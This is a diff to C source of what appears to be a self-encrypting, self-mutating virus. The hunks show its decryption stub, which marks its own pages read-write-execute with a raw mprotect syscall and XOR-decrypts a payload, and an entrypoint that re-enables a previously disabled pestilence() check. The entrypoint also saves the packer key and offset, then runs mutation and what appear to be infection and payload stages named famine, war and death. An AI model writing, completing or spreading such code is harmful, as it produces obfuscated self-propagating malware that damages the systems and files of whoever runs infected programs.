@@ -104,13 +104,14 @@ void decrypt_self(void)
 				"syscall\n"
 				: /* no output */
 				: "r"((long)SYS_mprotect), "r"(page_start), "r"(page_end - page_start), "r"((long)(PROT_READ | PROT_WRITE | PROT_EXEC))
-				: "rax", "rdi", "rsi", "memory"
+				: "rax", "rdi", "rsi", "memory" /* clobber */
 			);
 
 	}
 
-	uintptr_t dummy = (uintptr_t)&real_start;
-	xor_decrypt((void*)dummy, PAYLOAD_SIZE, g_key);
+	//uintptr_t dummy = (uintptr_t)&real_start;
+	void *start_addr = (void* )(uintptr_t)&real_start;
+	xor_decrypt(start_addr, PAYLOAD_SIZE, g_key);
 	return;
 }
 
@@ -304,13 +305,18 @@ void	entrypoint(int argc, char **argv, char **envp)
 	file_t file;
 	ft_memset(&file, 0, sizeof(file_t));
 
-	//if (pestilence() != 0) return ;
+	if (pestilence() != 0) return ;
 
 	/* saving these values (they will be overwritten by the packer) */
-	int start_offset = g_start_offset;
-	bool is_encrypted = g_is_encrypted;
 	uint8_t key[KEY_SIZE];
 	ft_memcpy(key, g_key, KEY_SIZE);
+
+	saved_vars_t saved = {
+		.start_offset = g_start_offset,
+		.is_encrypted = g_is_encrypted,
+		.key = {0}
+	};
+	ft_memcpy(saved.key, key, KEY_SIZE);
 
 	prepare_mutate();
 
@@ -318,9 +324,9 @@ void	entrypoint(int argc, char **argv, char **envp)
 
 	famine(&bootstrap_data, &counter);
 
-	if (war(counter, &file, start_offset) != 0) return ;
+	if (war(counter, &file, saved.start_offset) != 0) return ;
 
-	death(start_offset, key, &file, is_encrypted);
+	death(&saved, &file);
 }
 
 /* junk */
